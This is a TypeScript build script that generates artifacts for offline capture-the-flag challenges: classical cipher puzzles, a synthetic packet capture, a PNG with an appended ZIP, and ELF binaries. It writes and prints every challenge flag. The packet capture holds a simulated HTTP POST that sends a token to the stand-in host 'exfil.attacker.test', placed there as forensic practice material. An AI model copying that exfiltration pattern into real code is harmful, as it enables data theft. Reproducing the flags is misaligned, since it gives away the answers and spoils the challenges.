/**
 * Generates the offline challenge artifacts (synthetic, safe) into
 * build/artifacts/ and writes a manifest mapping each artifact to the static
 * flag the matching challenge should be configured with. The seed script reads
 * this manifest. Run: npx tsx challenges/generate-artifacts.ts
 */
import { createHash, execFileSync } from "./_compat";
import { crc32 } from "node:zlib";
import { mkdirSync, writeFileSync, existsSync } from "node:fs";
import path from "node:path";

const OUT = path.join(__dirname, "build", "artifacts");
mkdirSync(OUT, { recursive: true });

const manifest: Record<string, { file: string; sha256: string; flag: string; caseSensitive: boolean }> = {};

function emit(key: string, filename: string, data: Buffer, flag: string, caseSensitive = true) {
  const file = path.join(OUT, filename);
  writeFileSync(file, data);
  manifest[key] = { file: filename, sha256: createHash("sha256").update(data).digest("hex"), flag, caseSensitive };
}

// ── Caesar ──
function caesar(s: string, shift: number) {
  return s.replace(/[a-z]/gi, (c) => {
    const base = c <= "Z" ? 65 : 97;
    return String.fromCharCode(((c.charCodeAt(0) - base + shift) % 26) + base);
  });
}
const caesarFlag = "CQ{et_tu_brute_shift_thirteen}";
emit(
  "crypto-caesar",
  "crypto-caesar.txt",
  Buffer.from(
    `INTERCEPTED TRANSMISSION — classical cipher suspected.\n\n` +
      `${caesar("The quartermaster rotates the wheel thirteen places.", 13)}\n\n` +
      `${caesar(caesarFlag, 13)}\n\n` +
      `Hint: a Roman general favoured this shift.\n`,
  ),
  caesarFlag,
);

// ── Multi-stage: Base64 then Vigenère (key SECURITY) ──
function vigenere(s: string, key: string, decrypt = false) {
  let ki = 0;
  return s.replace(/[a-z]/gi, (c) => {
    const base = c <= "Z" ? 65 : 97;
    const k = key[ki % key.length]!.toLowerCase().charCodeAt(0) - 97;
    ki++;
    const shift = decrypt ? 26 - k : k;
    return String.fromCharCode(((c.charCodeAt(0) - base + shift) % 26) + base);
  });
}
const multiFlag = "CQ{layered_defences_need_layered_attacks}";
const stage2 = vigenere(multiFlag, "SECURITY"); // participant must reverse with the key
const stage1 = Buffer.from(
  `Stage 1 of 2 — decode me, then apply a Vigenere cipher with key SECURITY.\n\n${stage2}\n`,
).toString("base64");
emit(
  "crypto-multistage",
  "crypto-multistage.txt",
  Buffer.from(`Multi-stage puzzle.\nStep 1: this blob is Base64.\nStep 2: the decoded text explains the next step.\n\n${stage1.replace(/(.{76})/g, "$1\n")}\n`),
  multiFlag,
);

// ── Forensics: synthetic PCAP with a cleartext HTTP POST containing the flag ──
function pcapExfil(flag: string): Buffer {
  const packets: Buffer[] = [];
  const addPkt = (payload: Buffer, ts: number) => {
    const eth = Buffer.alloc(14);
    eth.writeUInt16BE(0x0800, 12);
    const ipLen = 20 + 20 + payload.length;
    const ip = Buffer.alloc(20);
    ip[0] = 0x45; ip.writeUInt16BE(ipLen, 2); ip[8] = 64; ip[9] = 6;
    ip.writeUInt32BE(0xc0a80164, 12); // 192.168.1.100
    ip.writeUInt32BE(0x5db8d822, 16); // 93.184.216.34 (synthetic)
    const tcp = Buffer.alloc(20);
    tcp.writeUInt16BE(49512, 0); tcp.writeUInt16BE(80, 2); tcp[12] = 0x50; tcp[13] = 0x18; tcp.writeUInt16BE(0xffff, 14);
    const frame = Buffer.concat([eth, ip, tcp, payload]);
    const rec = Buffer.alloc(16);
    rec.writeUInt32LE(ts, 0); rec.writeUInt32LE(0, 4); rec.writeUInt32LE(frame.length, 8); rec.writeUInt32LE(frame.length, 12);
    packets.push(rec, frame);
  };
  const t0 = 1_767_225_600;
  addPkt(Buffer.from("GET /status HTTP/1.1\r\nHost: updates.internal\r\n\r\n"), t0);
  addPkt(Buffer.from(`POST /collect HTTP/1.1\r\nHost: exfil.attacker.test\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nuser=svc-backup&token=${flag}&host=WKSTN-07`), t0 + 3);
  addPkt(Buffer.from("HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok"), t0 + 3);
  const gh = Buffer.alloc(24);
  gh.writeUInt32LE(0xa1b2c3d4, 0); gh.writeUInt16LE(2, 4); gh.writeUInt16LE(4, 6); gh.writeUInt32LE(0, 16); gh.writeUInt32LE(1, 20); // linktype 1 = Ethernet
  return Buffer.concat([gh, ...packets]);
}
const pcapFlag = "CQ{cleartext_http_is_forever}";
emit("forensics-exfil", "forensics-exfil.pcap", pcapExfil(pcapFlag), pcapFlag);

// ── Forensics: steganography — a valid PNG with a ZIP (containing the flag) appended ──
function minimalPng(): Buffer {
  const sig = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
  const chunk = (type: string, data: Buffer) => {
    const len = Buffer.alloc(4); len.writeUInt32BE(data.length, 0);
    const body = Buffer.concat([Buffer.from(type, "latin1"), data]);
    const crc = Buffer.alloc(4); crc.writeUInt32BE(crc32(body) >>> 0, 0);
    return Buffer.concat([len, body, crc]);
  };
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(1, 0); ihdr.writeUInt32BE(1, 4); ihdr[8] = 8; ihdr[9] = 2;
  // 1x1 black pixel, zlib-stored
  const idat = Buffer.from([0x78, 0x01, 0x01, 0x04, 0x00, 0xfb, 0xff, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x01]);
  return Buffer.concat([sig, chunk("IHDR", ihdr), chunk("IDAT", idat), chunk("IEND", Buffer.alloc(0))]);
}
function zipWith(name: string, content: Buffer): Buffer {
  const nameBuf = Buffer.from(name, "utf8");
  const crc = crc32(content) >>> 0;
  const local = Buffer.alloc(30);
  local.writeUInt32LE(0x04034b50, 0); local.writeUInt16LE(20, 4); local.writeUInt16LE(0x800, 6);
  local.writeUInt32LE(crc, 14); local.writeUInt32LE(content.length, 18); local.writeUInt32LE(content.length, 22);
  local.writeUInt16LE(nameBuf.length, 26);
  const central = Buffer.alloc(46);
  central.writeUInt32LE(0x02014b50, 0); central.writeUInt16LE((3 << 8) | 20, 4); central.writeUInt16LE(20, 6); central.writeUInt16LE(0x800, 8);
  central.writeUInt32LE(crc, 16); central.writeUInt32LE(content.length, 20); central.writeUInt32LE(content.length, 24);
  central.writeUInt16LE(nameBuf.length, 28); central.writeUInt32LE((0o100644 << 16) >>> 0, 38);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); eocd.writeUInt16LE(1, 8); eocd.writeUInt16LE(1, 10);
  const cdSize = central.length + nameBuf.length;
  const offset = local.length + nameBuf.length + content.length;
  eocd.writeUInt32LE(cdSize, 12); eocd.writeUInt32LE(offset, 16);
  return Buffer.concat([local, nameBuf, content, central, nameBuf, eocd]);
}
const stegoFlag = "CQ{appended_archives_hide_in_plain_sight}";
emit("forensics-stego", "forensics-stego.png", Buffer.concat([minimalPng(), zipWith("secret.txt", Buffer.from(`${stegoFlag}\n`))]), stegoFlag);

// ── Reverse: build the ELF binaries if a C compiler is available ──
const reverseFlag = "CQ{h4rdc0ded_x0r_1s_n0t_s3cret}";
try {
  const dir = path.join(__dirname, "pwn", "hardcoded-key");
  execFileSync("make", ["-C", dir], { stdio: "pipe" });
  const { readFileSync } = require("node:fs") as typeof import("node:fs");
  for (const bin of ["hardcoded-key", "hardcoded-key-stripped"]) {
    if (existsSync(path.join(dir, bin))) {
      emit(`reverse-${bin}`, `${bin}`, readFileSync(path.join(dir, bin)), reverseFlag);
    }
  }
  console.log("Built reverse-engineering ELF binaries.");
} catch (e) {
  console.warn("Skipped ELF build (no compiler?):", (e as Error).message);
}

writeFileSync(path.join(OUT, "manifest.json"), JSON.stringify(manifest, null, 2));
console.log(`\nGenerated ${Object.keys(manifest).length} artifacts in ${OUT}\n`);
for (const [k, v] of Object.entries(manifest)) console.log(`  ${k.padEnd(28)} ${v.file.padEnd(28)} sha256=${v.sha256.slice(0, 16)}…  flag=${v.flag}`);
